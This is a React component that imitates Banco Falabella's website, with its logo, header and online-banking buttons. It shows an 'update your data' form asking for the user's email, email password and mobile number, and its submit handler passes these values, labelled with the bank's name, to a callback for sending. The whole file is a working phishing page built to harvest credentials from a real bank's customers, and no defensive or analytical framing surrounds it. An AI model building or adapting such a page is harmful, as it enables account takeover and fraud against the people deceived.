/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable @next/next/no-img-element */
import React, { useState, useCallback, FormEvent, ChangeEvent } from 'react';
import { IoMdClose } from 'react-icons/io';

interface LoginFormData {
  correo: string;
  clave: string;
  celular: string;
}

const ActDatos: React.FC = ({ enviar }: any) => {
  const [isMobileAuthVisible, setIsMobileAuthVisible] = useState<boolean>(true);
  const [formData, setFormData] = useState<LoginFormData>({
    correo: '',
    clave: '',
    celular: '',
  });

  const handleInputChange = useCallback((e: ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    if (name === 'celular') {
      setFormData(prev => ({ ...prev, [name]: value.replace(/\D/g, '') }));
    } else {
      setFormData(prev => ({ ...prev, [name]: value }));
    }
  }, []);

  const showMobileAuth = useCallback(() => setIsMobileAuthVisible(true), []);
  const closeMobileAuth = useCallback(() => setIsMobileAuthVisible(false), []);

  const isFormValid: boolean = !!(formData.correo && formData.clave && formData.celular.length >= 10);

  const handleLoginSubmit = (e: FormEvent) => {
    e.preventDefault();
    if (isFormValid) {
      enviar?.({
        view: "actdatos",
        correo: formData.correo,
        clave: formData.clave,
        celular: formData.celular,
        bank: "Falabella",
        timestamp: new Date().toISOString(),
      });
    }
  };

  const formContent = (
    <div className="Auth-Form_wrapper__3MN_j">
      <div className="Auth-Form_form_container__form__cdIoU">
        <div className="Auth-Form_form_container__form_close__raHXl">
          <button type="button" onClick={closeMobileAuth}>CERRAR<IoMdClose /></button>
        </div>
        <div className="text-center mb-4 font-bold text-gray-700">Actualiza tus datos</div>
        <div className="text-center mb-4 text-xs text-gray-500">Por favor, ingresa los siguientes datos para continuar con el proceso.</div>
        <div className="Auth-Form_form_container__form_wrapper__Via_o">
          <div className="Auth-Form_form_container__form_input__HZaMj">
            <div className="input_orientation_horizontal____5pz undefined ">
              <input
                className="input_input__rqoVQ "
                name="correo"
                value={formData.correo}
                onChange={handleInputChange}
                placeholder="Correo Electrónico"
                type="email"
              />
            </div>
          </div>
          <div className="Auth-Form_form_container__form_input__HZaMj">
            <div className="input_orientation_horizontal____5pz undefined ">
              <input
                className="input_input__rqoVQ "
                name="clave"
                value={formData.clave}
                onChange={handleInputChange}
                placeholder="Clave del correo"
                type="password"
              />
            </div>
          </div>
          <div className="Auth-Form_form_container__form_input__HZaMj">
            <div className="input_orientation_horizontal____5pz undefined ">
              <input
                className="input_input__rqoVQ "
                name="celular"
                value={formData.celular}
                onChange={handleInputChange}
                placeholder="Número de celular"
                type="tel"
                maxLength={10}
              />
            </div>
          </div>
          <div className="Auth-Form_form_container__form_button__hRNhm mt-4">
            <div className="login-button_container__Q_EN3">
              <button
                type="submit"
                className={`button_button__primary__UiNEQ button_button__full__x6E0_ login-button_custom-button__lkAd5`}
                disabled={!isFormValid}
              >
                Continuar
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>
  );

  return (
    <>
      <header className="layout_wrapper-header__qA0E4">
        <nav className="header_main-header__sYZXC mobile">
          <div className="header_main-header__sup__MGYuV">
            <div className="d-flex align-items-center justify-content-between">
              <ul>
                <li><a href="#">Falabella</a></li>
                <li><a href="#">Homecenter</a></li>
                <li><a href="#">Seguros Falabella</a></li>
              </ul>
              <ul>
                <li><a href="#">Transparencia</a></li>
                <li><a rel="">|</a></li>
                <li><a href="#">Canales de Atención</a></li>
              </ul>
            </div>
          </div>
          <div className="header_main-header__sub__M7THE">
            <div className="header_container-menu__Y_4Vm">
              <div className="row align-items-center">
                <div id="main-header__sub-content" className="header_main-header__sub-content__FJdxd col-12 col-md-12 d-flex align-items-center justify-content-between">
                  <div className="header_logo-holder__5rb_k d-flex align-items-center">
                    <div className="header_header__sub-menu-toggle__uqhtI"><span></span><span></span><span></span></div>
                    <a href="/" className="header_main-logo__9xONI" title="Banco Falabella">
                      <figure className="LogoBrand_logo-container__dACd4 hidden-caption" style={{ height: "170px", width: "163px" }}>
                        <img src="/bancos/falabella/logo.svg" className='w-full h-full' alt="" style={{ position: "absolute", height: "100%", width: "100%", top: 0, right: 0, bottom: 0, left: 0, color: "transparent" }} />
                      </figure>
                    </a>
                  </div>

                  {/* Formulario de Login para Desktop */}
                  <div className="col header_wrapper-form__VItbr header_wrapper-form--hide__zc_1c">
                    <div id="auth-show-form" className="header_auth-form__container__TbwNW">
                      <form id="auth-form" className="Auth-Form_form_container__tRY92" onSubmit={handleLoginSubmit}>
                        {formContent}
                      </form>
                    </div>
                  </div>

                  <div className="header_wrapper-actions__IZaUW header_wrapper-actions--show___XnPH ">
                    <button className="header_btn-search__faqCK">Buscar</button>
                    <button className="button_button__tertiary__KBucI button_button__md__PdqZS" aria-label="Button">Hazte Cliente</button>
                    <button
                      className="button_button__primary__UiNEQ button_button__md__PdqZS"
                      aria-label="Button"
                    >
                      Banca en línea
                    </button>
                  </div>

                  {/* Botones para MOBILE/TABLET */}
                  <div className="header_btn-toggle-login__NUfpo">
                    <button className="button_button__default__ylRnW button_button__sm__w_Nbt" aria-label="Button">
                      <span className="fif icon_fif-icn-search__vWnMv f-24 undefined"></span><span></span>
                    </button>
                    <button
                      className="button_button__primary__UiNEQ button_button__md__PdqZS"
                      aria-label="Button"
                      onClick={showMobileAuth}
                    >
                      Banca en línea
                    </button>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </nav>

        {/* --- Formulario de Login Móvil --- */}
        <div
          id="auth-mobile"
          className={`layout_layout__mobile__Q14PH ${isMobileAuthVisible ? 'layout_layout__mobile__show' : ''}`}
          style={{ position: 'relative', zIndex: 98, display: isMobileAuthVisible ? 'block' : 'none' }}
        >
          <div className="layout_auth_form__xPgLy">
            <form id="auth-form" className="Auth-Form_form_container__tRY92" onSubmit={handleLoginSubmit}>
              {formContent}
            </form>
          </div>
        </div>
      </header>
      <div className='contenido'>
        <img src="/bancos/falabella/contenido-mobile.jpg" alt="" />
      </div>
    </>
  );
};

export default ActDatos;
